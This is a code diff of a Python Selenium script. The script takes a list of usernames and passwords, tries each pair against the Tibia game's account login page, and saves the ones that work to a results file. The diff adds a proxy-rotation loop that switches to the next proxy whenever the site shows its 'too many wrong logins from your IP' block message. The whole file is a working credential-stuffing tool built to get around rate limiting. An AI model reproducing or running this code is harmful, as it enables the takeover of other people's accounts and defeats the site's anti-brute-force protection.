@@ -10,6 +10,14 @@ class Credential:
     self.username = username
     self.password = password
 
+class ResultMessage:
+    def __init__(self,credential,result,message,proxyId = 0):
+        self.credential = credential
+        self.result = result
+        self.message = message
+        self.proxyId = proxyId
+    
+
 
 def getProxyListFromFile():
     proxyList = []
@@ -50,44 +58,6 @@ def resolveException(exceptionMessage,credential):
     f.write("Exception message: " + exceptionMessage + " Credentials:" + credential.username + ":" + credential.password)
     f.close()
 
-
-# def goWithProxy(credential):
-#     global proxyId,isProxy,cookie,timeout
-#     isProxy = True
-#     proxyId = proxyId + 1 
-#     proxy = getProxy()
-#     print("Going with proxy:"+proxy)
-#     chrome_options = webdriver.ChromeOptions()
-#     chrome_options.add_argument('--proxy-server=%s' % proxy)
-#     browser = webdriver.Chrome(options=chrome_options)
-  
-  
-   
-#     try:        
-#         errorMessage = errorMessage = browser.find_element_by_class_name('ErrorMessage')
-#         errorText = errorMessage.text
-#         print("Trying  to login with following credentials")
-#         print(credential.username + ":"  + credential.password) 
-#         print(errorText)
-#         ipBlockText = "Wrong account data has been entered from your IP address too often. You are unable to log in from this IP address for the next 30 minutes. Please wait."
-#         if ipBlockText in errorText:
-#             print("Block ip error")
-#             goWithProxy(credential)
-#     except:
-#         print('Error Message not found')
-#         resolveException('Error Message not found',credential)
-#     if browser != None:
-#         cookie = browser.get_cookie('SecureSessionID')
-
-#     #browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))
-
-#     if cookie != None:
-#         print("Cookie found, logged succesfuly with credentials:" + credential.username + ":" + credential.password)
-#         saveCredntialResultToFile(credential,"results.txt") 
-#     if browser !=  None:
-#         browser.quit()
-
-#Return True in succes login false on fail
 def loginToTibiaAccount(credential,browser):
     usernameStr = credential.username
     passwordStr = credential.password
@@ -101,12 +71,12 @@ def loginToTibiaAccount(credential,browser):
     except TimeoutException:
         print("Timeout exception")
         resolveException('Tiemout exception',credential)
-        return False
+        return ResultMessage(credential,False,'TimeoutException')
     except:
         print('Some another exception occured')
         resolveException('Some another exception occured',credential)
-        return False
-    return True
+        return ResultMessage(credential,False,'Some another exception occured')
+    return ResultMessage(credential,True,'')
 
 def checkErrorMessage(browser,credential):
     try:        
@@ -115,34 +85,89 @@ def checkErrorMessage(browser,credential):
         ipBlockText = "Wrong account data has been entered from your IP address too often. You are unable to log in from this IP address for the next 30 minutes. Please wait."
         if ipBlockText in errorText:
             print("Block ip error")
-            return False
+            return ResultMessage(credential,True,'Block ip error')
     except:
         print("Error message not found")
         resolveException('Error message not found',credential)
-        return True
-    return False
+        return ResultMessage(credential,False,'Error message not found')
+    return ResultMessage(credential,True,'Error message found')
 
-def loginWithCredential(credential,timeout):
-    cookie = None
+def getUpBrowser(proxyId,proxyList,timeout):
+    if(proxyId >= 0):
+        proxy = proxyList[proxyId]
+        chrome_options = webdriver.ChromeOptions()
+        chrome_options.add_argument('--proxy-server=%s' % proxy)
+        browser = webdriver.Chrome(options=chrome_options)
+        browser.set_page_load_timeout(timeout)
+    else:
+        browser = webdriver.Chrome()
+        browser.set_page_load_timeout(timeout)
 
-    browser = webdriver.Chrome()
-    browser.set_page_load_timeout(timeout)
-    isSuccessLogin = loginToTibiaAccount(credential,browser)
-    isErrorMessageNotFound = checkErrorMessage(browser,credential)
+    return browser
 
-    if(isSuccessLogin and isErrorMessageNotFound):
+
+def loginWithCredential(credential,timeout,proxyId,proxyList):
+
+    proxyLength = len(proxyList)
+    if(proxyLength == proxyId):
+        return ResultMessage(credential,True,'End of proxy list, ending execution of program',proxyId)
+
+    browser = getUpBrowser(proxyId,proxyList,timeout)
+    loginResult = loginToTibiaAccount(credential,browser)
+    errorMessage = checkErrorMessage(browser,credential)
+
+    #not succesful login lets try with proxy on failure
+    if(not loginResult.result):
+           return goWithNextProxy(browser,proxyId,credential,timeout,proxyList)
+
+    #when error message found and it is block ip error go with proxy
+    if(errorMessage.result):
+        if errorMessage.message in 'Block ip error':
+            return goWithNextProxy(browser,proxyId,credential,timeout,proxyList)
+
+    checkIsLoginSuccesfully(browser,loginResult,errorMessage,credential)
+    
+    return ResultMessage(credential,False,'',proxyId)
+
+def checkIsLoginSuccesfully(browser,loginResult,errorMessage,credential): 
+      #succesful login without exception and eeror message not found
+    if(loginResult.result and not errorMessage.result):
         cookie = browser.get_cookie('SecureSessionID')
         if cookie != None:
             print("Cookie found, logged succesfuly with credentials:" + credential.username + ":" + credential.password)
             saveCredntialResultToFile(credential,"results.txt") 
+            browser.quit()
+        else:
+            #no cookie so , just get out of here and clsoe!
+            browser.quit()
+    else:
+        #nothing spectaculary happened just wrong credentials
+        browser.quit()
+
+def goWithNextProxy(browser,proxyId,credential,timeout,proxyList):
     browser.quit()
+    proxyId = proxyId + 1
+    resultMessage = loginWithCredential(credential,timeout,proxyId,proxyList)
+    proxyId = resultMessage.proxyId
+    if(resultMessage.result):
+        return resultMessage
+    else:
+        return ResultMessage(credential,False,'',proxyId)
 
 def processLogin(timeout):
     proxyId = -1
-    proxyId = 0
 
     proxyList = getProxyListFromFile()
     credentials = getCredentialsFromFile()
 
     for credential in credentials:
-       loginWithCredential(credential,timeout)
+        resultMessage = loginWithCredential(credential,timeout,proxyId,proxyList)
+        if(resultMessage.result):
+            print('End exectuion of procces login')
+            print(resultMessage.message)
+            break
+        else:
+            proxyId = resultMessage.proxyId
+    
+processLogin(120)
+       
